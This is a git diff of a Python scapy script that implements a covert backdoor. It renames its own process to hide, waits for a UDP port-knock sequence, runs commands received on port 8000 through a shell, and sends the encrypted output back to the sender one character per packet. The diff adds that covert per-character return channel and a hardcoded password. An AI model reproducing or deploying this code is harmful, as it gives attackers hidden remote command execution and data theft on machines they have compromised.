@@ -1,11 +1,17 @@
 #!/usr/bin/python
 
-import logging, setproctitle, triplesec, encryption, configfile
+import logging, setproctitle, triplesec, encryption, configfile, packetFunctions, helpers
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
 
 state = 0
+ports = [1000, 2000, 3000]
+password = 'abcdefyoyo'
+maxPort = 65535
+# unauthClients = {}
+# authedClients = {}
+
 
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
@@ -43,15 +49,20 @@ def knock(packet):
 
 def shellCommand(packet, command):
     print "Running command " + command
+    ip = packet[IP].src
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = configfile.password + output.stdout.read() + output.stderr.read()
     encryptedData = encryption.encrypt(output, configfile.password)
-    packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=encryptedData)
-    send(packet)
+    lastIndex = len(encryptedData) - 1
+    for index, char in enumerate(encryptedData):
+        packet = packetFunctions.createPacketOne(configfile.protocol, ip, char)
+        if index == lastIndex:
+            packet = packet/Raw(load=configfile.password)
+        send(packet, verbose=0)
+        time.sleep(0.1)
 
 def watchAdd():
     print "watchAdd"
-
 
 def watchRemove():
     print "watchRemove"
@@ -86,9 +97,11 @@ def parseCommand(packet):
 def main():
     while state is not 3:
         sniff(filter='udp', prn=knock, count=1)
-    print "test"
     while True:
         sniff(filter="dst port 8000", count=1, prn=parseCommand)
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print "exiting.."
